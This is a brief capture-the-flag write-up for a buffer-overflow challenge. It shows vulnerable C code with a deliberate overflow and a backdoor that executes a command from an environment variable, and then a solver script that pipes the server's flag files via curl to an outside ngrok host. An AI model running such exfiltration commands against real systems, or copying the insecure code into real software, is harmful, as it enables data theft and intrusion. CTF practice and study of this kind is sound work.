# Go Pwn Gown (day7)

<p align="center">This challenge was a Pwn challenge in which the goal was to perform a buffer overflow to read the flag stored on the server. 

<p align="center"><img src="Screenshots/S1.png" alt="Desc"></p>

````c
void unsafeFunction(char *gown) {
    char buffer[64];
    memcpy(buffer, gown, 128); // UTF8 AMIRIGHT ?!
    printf("Received: %s\n", buffer);
}

void laluBackdoor() {
    char *bash_path = "/bin/bash";
    extern char **environ;
    execle(bash_path, bash_path, "-c", "echo $(${GOWN})", NULL, environ);
}
````

<p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S3.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S5.png" alt="Desc"></p>

````bash
#!/bin/bash
cat /flag/* | curl -X POST --data @- http://6.tcp.eu.ngrok.io:13524/
````

Flag : _RM{OffenSkillSaysWhat2024YouGotGowned}_ , thanks _Laluka_ for this challenge !
